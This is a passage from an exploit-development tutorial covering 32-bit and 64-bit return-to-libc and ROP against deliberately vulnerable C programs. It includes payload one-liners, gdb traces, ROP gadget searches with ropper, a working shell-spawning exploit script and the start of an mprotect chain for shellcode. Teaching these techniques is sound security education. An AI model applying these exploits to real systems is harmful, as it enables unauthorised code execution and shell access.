> libc actually contains a "/bin/sh" string, so we don't really need to supply the environment variable. You can verify this by using `strings /usr/lib/libc.so.6` from the terminal. You can find the address of this string in gdb by using `find &`*function*`,+9999999,"/bin/sh"`, where *function* is a libc function (e.g. `exit()`, `system()` or `printf()`).

Again, we need to add 5 bytes to the address to take us past the "MYSH=" part of the string. Now we got:

- 0xf7e464d0 <system>
- 0xf7e384ff <exit>
- 0xffffdfc2 "/bin/sh"

Now we are ready to exploit. We use `<<<` to feed the python output to the program's stdin.

```bash
(gdb) run <<< `python -c 'print 37 * "A" + "\xf7\xe4\x64\xd0"[::-1] + "\xf7\xe3\x84\xff"[::-1] + "\xff\xff\xdf\xc2"[::-1]'`
Input something: The first character was: A
[Detaching after fork from child process 14268]
[Inferior 1 (process 14265) exited normally]
```

What happened here? Everything seems to be working as we intended, as the process forks, and then exits normally. But the shell was never available to us.

The same thing happens in the shell:

```
$ python -c 'print 37 * "A" + "\xf7\xe4\x64\xd0"[::-1] + "\xf7\xe3\x84\xff"[::-1] + "\xff\xff\xdf\xc2"[::-1]' | env - PWD=$PWD MYSH=/bin/sh SHLVL=0 $PWD/r2l1
Input something: The first character was: A
$ pstree -p $$
bash(18246)───pstree(21130)
```

> I use pstree to show that there is currently only one process, 18246. `$$` is the pid of the current shell.

This is because stdin closes, causing the shell to exit.

We can prevent this by keeping stdin open:

```bash
$ cat <(python -c 'print 37 * "A" + "\xf7\xe4\x64\xd0"[::-1] + "\xf7\xe3\x84\xff"[::-1] + "\xff\xff\xdf\xc2"[::-1]') - | env - PWD=$PWD MYSH=/bin/sh SHLVL=0 $PWD/book/r2l1
Input something: The first character was: A
█
```

> <() is process substitution.

The blinking cursor now waits for our input. But how can we be sure this is the sh spawned from `r2l1`?

```
Input something: The first character was: A
echo $$
21159
<PRESS CTRL-Z>
$ pstree -p $$
bash(18246)─┬─cat(21155)───bash(21157)
            ├─pstree(21222)
            └─r2l1(21156)───sh(21159)
```

We use `echo $$` to get the pid of the shell, then suspend the job to get back to our main bash shell. The pstree shows us that 21159 is indeed a child of the vulnerable program r2l1.

> Use `fg` to resume the suspended job.

#### Intro to 64-bit ROP

The reason we started looking at ROP with a 32-bit program, is, as stated, that its simpler. If we were to do the same exploit as above on 64-bit, we immediately encounter an obstacle: 32-bit programs use the stack to pass function arguments, while 64-bit programs use registers How do we get the required function arguments (like the address of "/bin/sh" to `system()`) when we can only write to the stack?

This is where return-oriented programmed reveals itself as a huge subject of vast possibilities. Not only can we get any value we want into any register, we have access to Turing complete functionality.

Return-oriented programming is more than using using shared library functions to serve our needs. We can chain together pieces of program code and shared library code to accomplish any goal.

Let's start with showing how a simple return-to-libc attack is done. The program code below is exactly the same as in the previous section, but is compiled for 64-bit.

```c
/*
 * r2l2.c
 * gcc r2l2.c -fno-stack-protector -o r2l2
 */

#include <stdio.h>

void cp()
{
    char input[25];

    scanf("%s", input);
    printf("The first character was: %c\n", input[0]);
}

int main(int argc, char *argv[])
{
    printf("Input something: ");
    cp();

    return 0;
}
```

To successfully exploit the above program and get a shell with the `system()` function, we need to find a way to put the address of "/bin/sh" in the `%rdi` register before returning to `system()`.

In order to acheive this, we can search for instructions that pops from the stack into %rdi (since `%rdi` is where `system()` expects its argument) and then returns (or does something else that doesn't interfere with what we want to do, the returns). If we can't find an instruction like this, we can for example find and instruction that pops into some register and returns, then another that moves data from that register to `%rdi`, then returns.

> These small chunks of instructions ending in `ret` (or similar) are called *gadgets*.

The `ret` part is important. We are going to jump to a gadget by overflowing the stack and overwriting the return address. The stack will contain addresses of all gadgets we want to use, and the ret of one gadget will execute the next gadget in line.

Let's start by looking at the program binary for instructions with `%rdi`.

```
$ objdump -d r2l2 | grep '%[r,e]di'
   401071:       48 c7 c7 6f 11 40 00    mov    $0x40116f,%rdi
   4010a7:       bf 30 40 40 00          mov    $0x404030,%edi
   4010e9:       bf 30 40 40 00          mov    $0x404030,%edi
   401145:       bf 10 20 40 00          mov    $0x402010,%edi
   40115d:       bf 13 20 40 00          mov    $0x402013,%edi
   401177:       89 7d fc                mov    %edi,-0x4(%rbp)
   40117e:       bf 30 20 40 00          mov    $0x402030,%edi
   4011b0:       41 89 fd                mov    %edi,%r13d
   4011e6:       44 89 ef                mov    %r13d,%edi
```

> We will look at better and more efficient ways of looking for ROP-gadgets later on.

The last instruction moves data to `%edi` from `%r13d`, but there are function calls, a jump and a bunch of other instructions before `ret`:

```bash
$ objdump -d r2l2 | grep 4011e6 -A5
   4011e6:       44 89 ef                mov    %r13d,%edi
   4011e9:       41 ff 14 dc             callq  *(%r12,%rbx,8)
   4011ed:       48 83 c3 01             add    $0x1,%rbx
   4011f1:       48 39 dd                cmp    %rbx,%rbp
   4011f4:       75 ea                   jne    4011e0 <__libc_csu_init+0x40>
   4011f6:       48 83 c4 08             add    $0x8,%rsp
```

None of the instructions involving `%rdi` are interesting. What about `pop` instructions? We can find an instruction that pops into some register, then look for another instruction that moves data from that register to `%rdi`.

> The lower 32, 16 and 8 bits of 64-bit registers can be addressed directly. For  example `edi`, `di` and `dil` for the `rdi` register. Keep that in mind when looking for ROP gadgets.

```bash
$ objdump -d r2l2 | grep pop
   401059:       5e                      pop    %rsi
   40111d:       5d                      pop    %rbp
   4011fa:       5b                      pop    %rbx
   4011fb:       5d                      pop    %rbp
   4011fc:       41 5c                   pop    %r12
   4011fe:       41 5d                   pop    %r13
   401200:       41 5e                   pop    %r14
   401202:       41 5f                   pop    %r15
```

There are some useful instructions here. Now we can see if any of these are gadgets we can use:

```bash
$ objdump -d r2l2 | grep pop -A5
   401049:       5e                      pop    %rsi
   40104a:       48 89 e2                mov    %rsp,%rdx
   40104d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
   401051:       50                      push   %rax
   401052:       54                      push   %rsp
   401053:       49 c7 c0 f0 11 40 00    mov    $0x4011f0,%r8
   --
   40110d:       5d                      pop    %rbp
   40110e:       c3                      retq
   40110f:       90                      nop
   401110:       c3                      retq
   401111:       66 66 2e 0f 1f 84 00    data16 nopw %cs:0x0(%rax,%rax,1)
   401118:       00 00 00 00
   --
   4011da:       5b                      pop    %rbx
   4011db:       5d                      pop    %rbp
   4011dc:       41 5c                   pop    %r12
   4011de:       41 5d                   pop    %r13
   4011e0:       41 5e                   pop    %r14
   4011e2:       41 5f                   pop    %r15
   4011e4:       c3                      retq
   4011e5:       66 66 2e 0f 1f 84 00    data16 nopw %cs:0x0(%rax,%rax,1)
   4011ec:       00 00 00 00

   00000000004011f0 <__libc_csu_fini>:
```

The little gadget at 0x40111d that pops into `%rbp` and returns could be of use. As could and the last gadget. But both require that we find other gadgets, for example in libc, that move the data from one of the above registers to the `%rdi` register.

Instead of manually searching for gadgets, we can use a tool called `ropper`.

`ropper` is very useful for finding ROP gadgets (and much more). It can be installed using `pip install ropper` or by cloning it from https://github.com/sashs/Ropper.

Let's see what it finds in r2l2:

```bash
$ ropper -f r2l2 --search %rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: %rdi

[INFO] File: r2l2
0x00000000004010a6: or dword ptr [rdi + 0x404030], edi; jmp rax;
0x0000000000401203: pop rdi; ret;
```

> The '%' isn't part of the register name (like AT&T syntax), but means *any string*.

That last gadget is exactly what we need! Why didn't it show up when we looked at `pop` operations in r2l2 above?

The reason is that `ropper` can find overlapping instructions. You can check that the address of the instruction is nop in the regular disassembly of r2l2, but if we specify a the starting address in `objdump` it appears:

```bash
$ objdump -d ../r2l2 --start-address=0x401203
...
0000000000401203 <__libc_csu_init+0x63>:
  401203:       5f                      pop    %rdi
  401204:       c3                      retq
  401205:       66 66 2e 0f 1f 84 00    data16 nopw %cs:0x0(%rax,%rax,1)
...
```

Now we got at usable gadget at 0x401203.
We will call this gadget to pop the address of a "/bin/sh" string into `%rdi`, then call `system()`, then `exit()`. What does the stack need to look like to accomplish this?

If we use `disas cp` in gdb, we see that the buffer starts at -0x20(%rbp). We need to fill the buffer, overwrite the saved frame pointer and overwrite ret with the address of our gadget. Our gadget pops from the top of the stack, so we need to put the address of the "/bin/sh" string after ret. At this point we could encounter a major obstacle since we are going to write addresses containing null bytes to the stack. Luckily, `scanf` does not mind null bytes (unlike e.g. `strcpy`), so this is not a problem.

> We later look at how 0-byte addresses can be handled when the vulnerable program uses a function that stops writing at the first null byte (like `strcpy`).

Now, we can find the address of "/bin/sh", `system()` and `exit()`.

> In a previous section we found the function addresses by using gdb's `print` (`p`) command, while the string (which is in libc) was found with gdb's `find` command.

One way to accomplish this is to first find the base address of libc:

```bash
$ ldd r2l2
...
        libc.so.6 => /lib64/libc.so.6 (0x00007ffff7de9000)
...
```

And then find the offset of the string and functions:

```
$ strings -tx /lib64/libc-2.28.so  | grep bin/sh
 186519 /bin/sh
$ readelf -s /lib64/libc-2.28.so | grep system@
...
1418: 0000000000045c30    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
...
$ readelf -s /lib64/libc-2.28.so | grep exit
...
135: 000000000003ae30    32 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.2.5
...
```

Finding the addresses is now a matter of summing the base address and the offsets:

```
system:    0x00007ffff7de9000 + 45c30  = 0x00007ffff7e2ec30
exit:      0x00007ffff7de9000 + 3ae30  = 0x00007ffff7e23e30
"/bin/sh": 0x00007ffff7de9000 + 186519 = 0x00007ffff7f6f519
```

The gadget is at 0x0000000000401203. The buffer is 0x20 (32) bytes, and the saved frame pointer is of course 8 bytes.

Now we are ready to create the exploit. Let's make a binary file that we can feed to stdin in both gdb and in the terminal:

```bash
$ python -c 'print 40 * "a" + "\x00\x00\x00\x00\x00\x40\x12\x03"[::-1] + "\x00\x00\x7f\xff\xf7\xf6\xf5\x19"[::-1] + "\x00\x00\x7f\xff\xf7\xe2\xec\x30"[::-1] + "\x00\x00\x7f\xff\xf7\xe2\x3e\x30"[::-1]' > pl.bin
$ xxd pl.bin
00000000: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000020: 6161 6161 6161 6161 0312 4000 0000 0000  aaaaaaaa..@.....
00000030: 19f5 f6f7 ff7f 0000 30ec e2f7 ff7f 0000  ........0.......
00000040: 303e e2f7 ff7f 0000 0a                   0>.......
```

> The '0x0a at the end is the newline character from Python's print.

In gdb, break at the `ret` instruction of the cp function, and run the program with the file as input:

```bash
(gdb) disas cp
...
   0x000000000040116e <+56>:    retq
(gdb) b *cp+56
(gdb) r < pl.bin
```

The stack now looks like this:

```
(gdb) x/32xb $rsp
0x7fffffffd658: 0x03    0x12    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffd660: 0x19    0xf5    0xf6    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffd668: 0x30    0x3e    0xe2    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffd670: 0x19    0xf5    0xf6    0xf7    0xff    0x7f    0x00    0x00
```

On top is our gadget's address, followed by the address of the string, system and exit.

Let's move along and see what happens.

```bash
(gdb) disp/i $pc
1: x/i $pc
=> 0x40116e <cp+56>:    retq
(gdb) si
0x0000000000401203 in __libc_csu_init ()
1: x/i $pc
=> 0x401203 <__libc_csu_init+99>:       pop    %rdi
(gdb) si
0x0000000000401204 in __libc_csu_init ()
1: x/i $pc
=> 0x401204 <__libc_csu_init+100>:      retq
```

> We use `display/i $pc` to diplay the next instruction every time the program stops.

Let's confirm that the address of the string is in `rdi` and continue:

```bash
(gdb) x/s $rdi
0x7ffff7f6f519: "/bin/sh"
(gdb) si
0x00007ffff7e2ec30 in system () from /lib64/libc.so.6
1: x/i $pc
=> 0x7ffff7e2ec30 <system>:     endbr64
```

We are now in `system()`! We will continue to see if a shell pops.

```bash
(gdb) c
Continuing.
[Detaching after fork from child process 11941]
[Inferior 1 (process 11934) exited with code 02]
```

A fork and an exit. That looks good! Again, the shell closes immediately since stdin closes, but this is easy to get past in the shell:

```
$ (cat pl.bin; cat) | ./r2l2
Input something: The first character was: a
echo $$
12779
<PRESS CTRL-Z>
[1]+  Stopped                 ( cat pl.bin; cat ) | ./r2l2
$ pstree -p $$
bash(11617)─┬─bash(12776)───cat(12780)
            ├─pstree(12800)
            └─r2l2(12777)───sh(12779)
```

We got a shell!

As a final exercise, we'll fix the exit code. As you may have noticed in the gdb output above, the program exits with exit code 2:

```
$ (cat pl.bin; cat) | ./r2l2
Input something: The first character was: a
^C
$ echo $?
2
```

> The `%rdi` register is changed to 0x2 by a function called by `system()`. The `%rdi` register is *volatile* (not preserved acrosss function calls).

We need to find a gadget that we can run before `exit()` that will put zero into `%rdi`. Luckily, we already have a gadget like this, our old pal `pop %rdi; ret`. By putting its address and 8 null bytes before the address of `exit()`, we can accomplish our goal:

```python
# r2l2_exploit.py
import struct

pad = 40 * "a"
ecode = 8 * "\x00"
poprdi  = struct.pack("<Q", 0x401203)
binsh   = struct.pack("<Q", 0x7ffff7f6f519)
csystem = struct.pack("<Q", 0x7ffff7e2ec30)
cexit   = struct.pack("<Q", 0x7ffff7e23e30)

print pad + poprdi + binsh + csystem + poprdi + ecode + cexit
```

> The above exploit is more readable and easier to modify than a long oneliner. The `struct.pack("<Q", ...)` let's us type in addresses without leading zeroes and have them returned as a string packed to a little-endian unsigned long long (8 bytes).

You can run the above exploit like this in gdb (if you for example want to study the stack and register states):

```bash
(gdb) r < <(python r2l2_exploit.py)
Input something: The first character was: a
[Detaching after fork from child process 14240]
[Inferior 1 (process 14231) exited normally]
```

And like this in the terminal:

```bash
$ (python r2l2_exploit.py; cat) | ./r2l2
Input something: The first character was: a
^C
$ echo $?
0
```

> There are of course a bunch of other ways to zero out `%rdi`. See if you can find another gadget to do this.

That covers the return-to-libc on 64-bit, and serves as an intro to return-oriented programming. In the next section we will at more advanced ROP techniques.

Now that you're comfortable with the basics of return-oriented programming, doing a return-to-libc attack on 32-bit and 64-bit systems should be about equally easy. In the next section we will study some of the more advanced possibilites of return-orented programming.

#### ROP to get RWX memory for shellcode

ROP can be used to change the access protections of a vulnerable process's memory pages to give us an area from which we can launch shellcode. Continuing to exploit r2l2, we will use the `mprotect()` syscall to turn a page of memory RWX, then inject and execute shellcode.

From `man mprotect`, we know that `mprotect()` wants three arguments:

```c
int mprotect(void *addr, size_t len, int prot);
```

The first two arguments will decide which region of memory we will change permissions on. The last argument will be 0x7 (which is RWX). These arguments are of course passed in `%rdi`, `%rsi` and `%rdx`. We will put the arguments on the stack, then use gadgets to pop them into the registers.

Since `mprotect` is a syscall, we need to put its syscall number in `%rax`, then do a `syscall` instruction.

The syscall number is for `mprotect` is 10:

```bash
$ grep mprotect /usr/include/asm/unistd*
...
/usr/include/asm/unistd_64.h:#define __NR_mprotect 10
...
```

Since 10 (0xa) is the newline character, we can't get it through stdin, as `scanf` will stop reading after a newline. We will look for a gadget that e.g. moves the value 10 into `%rax`, or run an `inc %rax` gadget multiple times.

We find the needed gadgets in libc:

```bash
$ ropper

(ropper)> file /lib64/libc-2.28.so

(libc-2.28.so/ELF/x86_64)> search /1/ pop%; ret
0x0000000000023dd3: pop rdi; ret;
...
0x000000000010ae46: pop rdx; ret;
...
0x000000000002477e: pop rsi; ret;
...

(libc-2.28.so/ELF/x86_64)> search syscall; ret
...
0x00000000000b8ba9: syscall; ret;

(libc-2.28.so/ELF/x86_64)> search /1/ mov rax, 7
...
0x00000000000b7d40: mov rax, 7; ret;

(libc-2.28.so/ELF/x86_64)> search /1/ add rax
...
0x00000000000b7cb0: add rax, 1; ret;
```

Notice that to get 0xa into rax, we first use a gadget to move the value 7 into it (this gadget was found with searches starting at 10), then run a gadget that adds one to i three times.

> `/1/` tells ropper to show only gadgets of the best quality.

> Try to find alternative, usable gadgets as a challenge. Maybe there is a gadget that can do the work of many of the above gadgets?

The second challenge is to put shellcode in our RWX memory.

...
